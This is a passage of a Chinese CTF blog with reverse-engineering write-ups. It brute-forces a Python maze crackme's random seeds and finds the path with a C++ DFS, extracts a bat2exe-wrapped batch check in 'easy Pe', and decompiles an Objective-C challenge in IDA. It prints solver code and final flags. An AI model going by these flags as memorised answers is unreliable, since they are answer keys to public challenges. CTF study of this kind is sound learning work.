class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">9</span>]]</span><br><span class="line">s = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line">seed = time.time()</span><br><span class="line">random.seed(seed)</span><br><span class="line">random.seed(random.randint(<span class="number">0</span>, <span class="number">999999</span>))</span><br><span class="line">maze[<span class="number">1</span>][<span class="number">1</span>] = random.randint(<span class="number">987</span>, <span class="number">1000</span>)</span><br><span class="line">maze[<span class="number">3</span>][<span class="number">4</span>] = random.randint(<span class="number">345</span>, <span class="number">356</span>)</span><br><span class="line">maze[<span class="number">7</span>][<span class="number">7</span>] = random.randint(<span class="number">107</span>, <span class="number">116</span>)</span><br><span class="line">maze[<span class="number">11</span>][<span class="number">8</span>] = random.randint(<span class="number">833</span>, <span class="number">856</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">        tmp = <span class="number">12</span> * i + j</span><br><span class="line">        <span class="keyword">if</span> maze[i][j] == <span class="number">0</span>:</span><br><span class="line">            maze[i][j] = <span class="number">3456</span> + tmp</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> tmp % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">            random.seed(maze[<span class="number">1</span>][<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">for</span> cnt <span class="keyword">in</span> <span class="built_in">range</span>(tmp):</span><br><span class="line">                random.randint(<span class="number">0</span>, <span class="number">999</span>)</span><br><span class="line"></span><br><span class="line">            maze[i][j] = random.randint(<span class="number">0</span>, <span class="number">999</span>)</span><br><span class="line">        <span class="keyword">elif</span> tmp % <span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">            random.seed(maze[<span class="number">3</span>][<span class="number">4</span>])</span><br><span class="line">            <span class="keyword">for</span> cnt <span class="keyword">in</span> <span class="built_in">range</span>(tmp):</span><br><span class="line">                random.randint(<span class="number">555</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">            maze[i][j] = random.randint(<span class="number">555</span>, <span class="number">1234</span>)</span><br><span class="line">        <span class="keyword">elif</span> tmp % <span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">            random.seed(maze[<span class="number">7</span>][<span class="number">7</span>])</span><br><span class="line">            <span class="keyword">for</span> cnt <span class="keyword">in</span> <span class="built_in">range</span>(tmp):</span><br><span class="line">                random.randint(<span class="number">777</span>, <span class="number">888</span>)</span><br><span class="line"></span><br><span class="line">            maze[i][j] = random.randint(<span class="number">777</span>, <span class="number">888</span>)</span><br><span class="line">        <span class="keyword">elif</span> tmp % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">            random.seed(maze[<span class="number">11</span>][<span class="number">8</span>])</span><br><span class="line">            <span class="keyword">for</span> cnt <span class="keyword">in</span> <span class="built_in">range</span>(tmp):</span><br><span class="line">                random.randint(<span class="number">369</span>, <span class="number">777</span>)</span><br><span class="line"></span><br><span class="line">            maze[i][j] = random.randint(<span class="number">369</span>, <span class="number">777</span>)</span><br><span class="line"></span><br><span class="line">maze[<span class="number">11</span>][<span class="number">11</span>] = <span class="number">9</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(s) != <span class="number">56</span>:</span><br><span class="line">    sys.exit(-<span class="number">1</span>)</span><br><span class="line">idx1 = <span class="number">0</span></span><br><span class="line">idx2 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">        idx1 -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            idx1 += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">                idx2 -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> i == <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">                    idx2 += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt;= maze[idx1][idx2] &lt;= <span class="number">1234</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Where are you going?&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> maze[idx1][idx2] != <span class="number">9</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;You lost in the maze!&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> xx <span class="keyword">in</span> maze:</span><br><span class="line">    <span class="keyword">for</span> xxx <span class="keyword">in</span> xx:</span><br><span class="line">        result += <span class="built_in">str</span>(xxx)</span><br><span class="line"></span><br><span class="line">hash_res = hashlib.sha256(result.encode(<span class="string">&#x27;latin-1&#x27;</span>)).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(hash_res)</span><br><span class="line"><span class="keyword">if</span> hash_res == <span class="string">&#x27;f1793dcf5ad3858512b944ac34413725a27c63e25618858231e88b9686466b00&#x27;</span>:</span><br><span class="line">    flag1 = <span class="built_in">str</span>(maze[<span class="number">1</span>][<span class="number">1</span>]) + <span class="built_in">str</span>(maze[<span class="number">7</span>][<span class="number">7</span>]) + <span class="built_in">str</span>(maze[<span class="number">11</span>][<span class="number">8</span>]) + <span class="built_in">str</span>(maze[<span class="number">3</span>][<span class="number">4</span>])</span><br><span class="line">    flag2 = hashlib.sha256(s.encode(<span class="string">&#x27;latin-1&#x27;</span>)).hexdigest()</span><br><span class="line">    flag = flag2[::-<span class="number">1</span>] + flag1[::-<span class="number">1</span>]</span><br><span class="line">    final_flag = hashlib.sha256(flag.encode(<span class="string">&#x27;latin-1&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + final_flag[<span class="number">0</span>:<span class="number">32</span>] + <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看着貌似随机很多 但是发现好多seed没用 有用的seed就是maze[1][1]&#x2F;maze[7][7]&#x2F;maze[11][8]&#x2F;maze[3][4]<br>题目给了范围枚举爆破即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">987</span>,<span class="number">1001</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> trange(<span class="number">345</span>,<span class="number">357</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">107</span>,<span class="number">117</span>):</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">833</span>,<span class="number">857</span>):</span><br><span class="line">                        maze = [</span><br><span class="line">                            [</span><br><span class="line">                            ]</span><br><span class="line">                        ]</span><br><span class="line">                        _ += <span class="number">1</span></span><br><span class="line">                        <span class="comment"># print(_)</span></span><br><span class="line">                        seed = time.time()</span><br><span class="line">                        random.seed(seed)</span><br><span class="line">                        random.seed(random.randint(<span class="number">0</span>, <span class="number">999999</span>))</span><br><span class="line">                        maze[<span class="number">1</span>][<span class="number">1</span>] = a</span><br><span class="line">                        maze[<span class="number">3</span>][<span class="number">4</span>] = b</span><br><span class="line">                        maze[<span class="number">7</span>][<span class="number">7</span>] = c</span><br><span class="line">                        maze[<span class="number">11</span>][<span class="number">8</span>] = d</span><br><span class="line">                        ...</span><br><span class="line">                        maze[<span class="number">11</span>][<span class="number">11</span>] = <span class="number">9</span></span><br><span class="line">                        <span class="comment"># print(maze)</span></span><br><span class="line">                        result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                        <span class="keyword">for</span> xx <span class="keyword">in</span> maze:</span><br><span class="line">                            <span class="keyword">for</span> xxx <span class="keyword">in</span> xx:</span><br><span class="line">                                result += <span class="built_in">str</span>(xxx)</span><br><span class="line"></span><br><span class="line">                        hash_res = hashlib.sha256(result.encode(<span class="string">&#x27;latin-1&#x27;</span>)).hexdigest()</span><br><span class="line">                        <span class="keyword">if</span> hash_res == <span class="string">&#x27;f1793dcf5ad3858512b944ac34413725a27c63e25618858231e88b9686466b00&#x27;</span>:</span><br><span class="line">                            <span class="built_in">print</span>(maze)</span><br><span class="line">                            exit()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">maze = [[<span class="number">937</span>, <span class="number">3457</span>, <span class="number">3458</span>, <span class="number">3459</span>, <span class="number">3460</span>, <span class="number">3461</span>, <span class="number">3462</span>, <span class="number">3463</span>, <span class="number">3464</span>, <span class="number">3465</span>, <span class="number">3466</span>, <span class="number">3467</span>], [<span class="number">360</span>, <span class="number">671</span>, <span class="number">3470</span>, <span class="number">3471</span>, <span class="number">954</span>, <span class="number">741</span>, <span class="number">815</span>, <span class="number">3475</span>, <span class="number">3476</span>, <span class="number">3477</span>, <span class="number">3478</span>, <span class="number">3479</span>], [<span class="number">3480</span>, <span class="number">1232</span>, <span class="number">836</span>, <span class="number">3483</span>, <span class="number">934</span>, <span class="number">3485</span>, <span class="number">886</span>, <span class="number">588</span>, <span class="number">487</span>, <span class="number">830</span>, <span class="number">3490</span>, <span class="number">3491</span>], [<span class="number">3492</span>, <span class="number">3493</span>, <span class="number">854</span>, <span class="number">696</span>, <span class="number">744</span>, <span class="number">3497</span>, <span class="number">3498</span>, <span class="number">3499</span>, <span class="number">3500</span>, <span class="number">1066</span>, <span class="number">3502</span>, <span class="number">3503</span>], [<span class="number">3504</span>, <span class="number">3505</span>, <span class="number">3506</span>, <span class="number">3507</span>, <span class="number">3508</span>, <span class="number">3509</span>, <span class="number">781</span>, <span class="number">447</span>, <span class="number">677</span>, <span class="number">598</span>, <span class="number">3514</span>, <span class="number">3515</span>], [<span class="number">3516</span>, <span class="number">3517</span>, <span class="number">3518</span>, <span class="number">3519</span>, <span class="number">3520</span>, <span class="number">3521</span>, <span class="number">793</span>, <span class="number">3523</span>, <span class="number">3524</span>, <span class="number">3525</span>, <span class="number">3526</span>, <span class="number">3527</span>], [<span class="number">3528</span>, <span class="number">580</span>, <span class="number">787</span>, <span class="number">622</span>, <span class="number">63</span>, <span class="number">3533</span>, <span class="number">861</span>, <span class="number">618</span>, <span class="number">269</span>, <span class="number">1118</span>, <span class="number">791</span>, <span class="number">3539</span>], [<span class="number">3540</span>, <span class="number">993</span>, <span class="number">3542</span>, <span class="number">3543</span>, <span class="number">665</span>, <span class="number">3545</span>, <span class="number">3546</span>, <span class="number">400</span>, <span class="number">3548</span>, <span class="number">3549</span>, <span class="number">807</span>, <span class="number">3551</span>], [<span class="number">3552</span>, <span class="number">650</span>, <span class="number">3554</span>, <span class="number">3555</span>, <span class="number">297</span>, <span class="number">3557</span>, <span class="number">3558</span>, <span class="number">3559</span>, <span class="number">3560</span>, <span class="number">801</span>, <span class="number">845</span>, <span class="number">3563</span>], [<span class="number">3564</span>, <span class="number">1222</span>, <span class="number">872</span>, <span class="number">3567</span>, <span class="number">298</span>, <span class="number">1072</span>, <span class="number">827</span>, <span class="number">640</span>, <span class="number">847</span>, <span class="number">1046</span>, <span class="number">3574</span>, <span class="number">3575</span>], [<span class="number">3576</span>, <span class="number">3577</span>, <span class="number">817</span>, <span class="number">599</span>, <span class="number">3580</span>, <span class="number">3581</span>, <span class="number">3582</span>, <span class="number">3583</span>, <span class="number">3584</span>, <span class="number">3585</span>, <span class="number">3586</span>, <span class="number">3587</span>], [<span class="number">3588</span>, <span class="number">3589</span>, <span class="number">3590</span>, <span class="number">506</span>, <span class="number">926</span>, <span class="number">1161</span>, <span class="number">853</span>, <span class="number">687</span>, <span class="number">440</span>, <span class="number">1026</span>, <span class="number">860</span>, <span class="number">9</span>]]</span><br></pre></td></tr></table></figure><p>然后C++写个dfs跑就得了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> a[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> dx[<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> dy[<span class="number">4</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">char</span> ccc[<span class="number">4</span>]=&#123;<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;a&#x27;</span>&#125;;</span><br><span class="line"><span class="type">int</span> vis[<span class="number">13</span>][<span class="number">13</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y,string jl,<span class="type">int</span> cnt)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x==<span class="number">12</span>&amp;&amp;y==<span class="number">12</span>&amp;&amp;cnt==<span class="number">56</span>)&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;[+] Find! \n&quot;</span>;</span><br><span class="line">cout&lt;&lt;jl&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line"><span class="type">int</span> nx=x+dx[i],ny=y+dy[i];</span><br><span class="line"><span class="keyword">if</span>(nx&gt;=<span class="number">1</span>&amp;&amp;nx&lt;=<span class="number">12</span>&amp;&amp;ny&gt;=<span class="number">1</span>&amp;&amp;ny&lt;=<span class="number">12</span>&amp;&amp;a[nx][ny]&lt;=<span class="number">1234</span>&amp;&amp;!vis[nx][ny])&#123;</span><br><span class="line">vis[nx][ny]=<span class="number">1</span>;</span><br><span class="line"><span class="built_in">dfs</span>(nx,ny,jl+ccc[i],cnt+<span class="number">1</span>);</span><br><span class="line">vis[nx][ny]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ma[<span class="number">1006</span>]=&#123;...&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">12</span>;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">12</span>;j++)</span><br><span class="line">a[i][j] = ma[(i<span class="number">-1</span>)*<span class="number">12</span>+j<span class="number">-1</span>];</span><br><span class="line"><span class="built_in">dfs</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&quot;&quot;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>路径:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = sdsdsddwwddsdddssaaassddddssasaaaaawwwaaasssdsdsdddddddd</span><br></pre></td></tr></table></figure><p>最后flag<br><strong>flag{e1df25dac4906584fe2d6f155b60e233}</strong></p><h2 id="NSSCTF-2022-Spring-Recruit-easy-Pe"><a href="#NSSCTF-2022-Spring-Recruit-easy-Pe" class="headerlink" title="[NSSCTF 2022 Spring Recruit]easy Pe"></a>[NSSCTF 2022 Spring Recruit]easy Pe</h2><p>2024年做的第一道逆向题~<br>虽说有来源 但是懒得新建分类了</p><p>这题挺有意思的 用CFFEXPLOERER看可以看到有t.exe以外的resource<br>点击运行exe可以发现在执行cmdshell之前有一个短暂的gui界面</p><p>IDA打开exe<br>WinMain的341行可以找到</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sub_401A18</span>(&amp;lpText, v37);</span><br><span class="line">StartupInfo.dwXCountChars = <span class="number">0</span>;</span><br><span class="line">StartupInfo.dwYCountChars = <span class="number">1</span>;</span><br><span class="line">StartupInfo.hStdError = <span class="number">0</span>;</span><br><span class="line">StartupInfo.dwYSize = v50 != <span class="number">0</span> ? (DWORD)lpText : <span class="number">0</span>;</span><br><span class="line"><span class="built_in">ShellExecuteExA</span>((SHELLEXECUTEINFOA *)&amp;StartupInfo.lpDesktop);</span><br></pre></td></tr></table></figure><p>这里就是最终呈现给我们的shell窗口<br>动调 在这前面很容易看到一堆messagebox<br>注意到有很多lpathname这种<br>在256行</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">sub_401EC1</span>(v36);</span><br><span class="line">  <span class="built_in">sub_405040</span>(v36);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">SetCurrentDirectoryA</span>(lpPathName[<span class="number">0</span>]) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">SetCurrentDirectoryA</span>(v36[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">FREE</span>((<span class="type">void</span> *)v36[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">FREE</span>(v28[<span class="number">0</span>]);</span><br><span class="line">LABEL_42:</span><br><span class="line">  ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里动调可以发现lpPathName[0]指向C:&#x2F;&#x2F;USER&#x2F;xxx&#x2F;AppData&#x2F;local&#x2F;tmp 下的一个文件<br>我电脑上就是这个路径 C:\Users\asus\AppData\Local\Temp\7zS24E6.tmp<br>打开发现有一个bat2exe.exe 还有一个bat  点击bat运行发现就是我们之前看到的shell窗口</p><p>顾名思义这个bat2exe是将.bat转成.exe 那么我们查看.bat内容 直接右键打不开 转成.txt打开</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">set</span> /p input =please input flag:</span><br><span class="line"><span class="built_in">set</span> input|findstr <span class="string">&quot;\&lt;123123\&gt;&quot;</span></span><br><span class="line">cls</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%errorlevel%&quot;</span> == <span class="string">&quot;0&quot;</span> ( goto 0 ) ELSE (goto 1)</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">:0</span><br><span class="line"><span class="built_in">echo</span> good_job!</span><br><span class="line">pause</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">:1</span><br><span class="line"><span class="built_in">echo</span> sorry...</span><br><span class="line">pause</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>很清晰 flag就是123123<br>同时输入完后的cls也印证了前面输入完被清空的现象<br><strong>NSSCTF{123123}</strong></p><hr><hr><p>总的来说还是一道很新颖的题的<br>我的解题突破口就在于发现lpathname这种敏感变量<br>PE千变万化 还要继续加油学习!</p><h2 id="ctfshow-卷王杯-babyoc"><a href="#ctfshow-卷王杯-babyoc" class="headerlink" title="ctfshow-卷王杯-babyoc"></a>ctfshow-卷王杯-babyoc</h2><p>一道Object-C的题 一些独特的语法 记录一下<br>网上粗略学了一下Object-C 然而进IDA还是看不怎么懂…</p><p>在主函数很容易找到输入点 enc check<br>函数列表翻翻还能找到xor add 这种运算<br>看enc<br>分奇偶位进行了处理<br>程序这么写的:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; *(_QWORD *)(a1 + <span class="number">16</span>); i += <span class="number">2LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = <span class="built_in">objc_get_class</span>(<span class="string">&quot;flagChar&quot;</span>, v10, v12);</span><br><span class="line">    v14 = (__int64 (__fastcall *)(__int64, <span class="type">char</span> **))<span class="built_in">objc_msg_lookup</span>(v13, off_55EC019DFA50);</span><br><span class="line">    v30 = <span class="built_in">v14</span>(v13, off_55EC019DFA50);</span><br><span class="line">    v15 = (<span class="built_in">void</span> (__fastcall *)(__int64, <span class="type">char</span> **, _QWORD))<span class="built_in">objc_msg_lookup</span>(v30, off_55EC019DFA60);</span><br><span class="line">    <span class="built_in">v15</span>(v30, off_55EC019DFA60, (<span class="type">unsigned</span> __int16)(<span class="number">1249</span> * i));</span><br><span class="line">    v16 = (<span class="built_in">void</span> (__fastcall *)(__int64, <span class="type">char</span> **, _QWORD))<span class="built_in">objc_msg_lookup</span>(v30, off_55EC019DFA80);</span><br><span class="line">    v17 = (__int64 (__fastcall *)(__int64, <span class="type">char</span> **, <span class="type">unsigned</span> __int64))<span class="built_in">objc_msg_lookup</span>(a3, off_55EC019DFA70);</span><br><span class="line">    v18 = <span class="built_in">v17</span>(a3, off_55EC019DFA70, i);</span><br><span class="line">    <span class="built_in">v16</span>(v30, off_55EC019DFA80, v18);</span><br><span class="line">    v19 = *(_QWORD *)(a1 + <span class="number">8</span>);</span><br><span class="line">    v20 = (<span class="built_in">void</span> (__fastcall *)(__int64, <span class="type">char</span> **, __int64))<span class="built_in">objc_msg_lookup</span>(v19, off_55EC019DFA90);</span><br><span class="line">    v10 = off_55EC019DFA90;</span><br><span class="line">    <span class="built_in">v20</span>(v19, off_55EC019DFA90, v30);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这是真看着头大<br>看汇编发现一些 I: Y: 这种字符<br>查看交叉引用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">000055</span>EC019DF590 C2 F0 <span class="number">9</span>D <span class="number">01</span> EC <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>       dq offset aR                            ; <span class="string">&quot;R&quot;</span></span><br><span class="line">.data:<span class="number">000055</span>EC019DF598 B8 F1 <span class="number">9</span>D <span class="number">01</span> EC <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>       dq offset aQ1608_0                      ; <span class="string">&quot;Q16@0:8&quot;</span></span><br><span class="line">.data:<span class="number">000055</span>EC019DF5A0 E3 C3 <span class="number">9</span>D <span class="number">01</span> EC <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>       dq offset sub_55EC019DC3E3</span><br><span class="line">.data:<span class="number">000055</span>EC019DF5A8 C4 F0 <span class="number">9</span>D <span class="number">01</span> EC <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>       dq offset aI                            ; <span class="string">&quot;I:&quot;</span></span><br><span class="line">.data:<span class="number">000055</span>EC019DF5B0 C0 F1 <span class="number">9</span>D <span class="number">01</span> EC <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>       dq offset aV2408q16                     ; <span class="string">&quot;v24@0:8Q16&quot;</span></span><br><span class="line">.data:<span class="number">000055</span>EC019DF5B8 C4 C3 <span class="number">9</span>D <span class="number">01</span> EC <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>       dq offset sub_55EC019DC3C4</span><br><span class="line">.data:<span class="number">000055</span>EC019DF5C0 C7 F0 <span class="number">9</span>D <span class="number">01</span> EC <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>       dq offset aY                            ; <span class="string">&quot;Y:&quot;</span></span><br><span class="line">.data:<span class="number">000055</span>EC019DF5C8 C0 F1 <span class="number">9</span>D <span class="number">01</span> EC <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>       dq offset aV2408q16                     ; <span class="string">&quot;v24@0:8Q16&quot;</span></span><br><span class="line">.data:<span class="number">000055</span>EC019DF5D0 <span class="number">9</span>A C3 <span class="number">9</span>D <span class="number">01</span> EC <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>       dq offset sub_55EC019DC39A</span><br><span class="line">.data:<span class="number">000055</span>EC019DF5D8 CA F0 <span class="number">9</span>D <span class="number">01</span> EC <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>       dq offset aA                            ; <span class="string">&quot;A:&quot;</span></span><br><span class="line">.data:<span 